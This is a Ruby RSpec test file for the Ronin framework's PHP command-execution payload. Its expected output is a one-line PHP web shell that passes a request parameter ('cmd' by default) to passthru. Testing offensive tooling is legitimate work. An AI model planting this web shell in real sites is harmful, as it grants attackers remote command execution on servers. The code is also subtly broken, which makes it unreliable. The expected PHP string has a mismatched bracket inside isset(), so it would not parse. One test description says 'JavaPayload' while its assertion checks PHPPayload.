require 'spec_helper'
require 'ronin/payloads/builtin/php/cmd_exec'

describe Ronin::Payloads::PHP::CmdExec do
  it "must inherit from Ronin::Payloads::JavaPayload" do
    expect(described_class).to be < Ronin::Payloads::PHPPayload
  end

  describe ".id" do
    subject { described_class }

    it "must equal 'php/cmd_exec'" do
      expect(subject.id).to eq('php/cmd_exec')
    end
  end

  describe "params" do
    describe "query_param" do
      it "must default to 'cmd'" do
        expect(subject.params[:query_param]).to eq('cmd')
      end
    end
  end

  describe "#build" do
    before { subject.build }

    it "must return PHP code that executes the command from the 'cmd' query_param and returns the output in <exec>...</exec> tags" do
      expect(subject.payload).to eq(
        %{if(isset($_REQUEST["cmd")){echo "<exec>";passthru($_REQUEST["cmd"]);echo "</exec>";}}
      )
    end

    context "when the query_param param is set to a different value" do
      let(:query_param) { 'other' }

      subject do
        described_class.new(
          params: {
            query_param: query_param
          }
        )
      end

      it "must return PHP code that executes the command from the  query_param and returns the output in <exec>...</exec> tags" do
        expect(subject.payload).to eq(
          %{if(isset($_REQUEST["#{query_param}")){echo "<exec>";passthru($_REQUEST["#{query_param}"]);echo "</exec>";}}
        )
      end
    end
  end
end
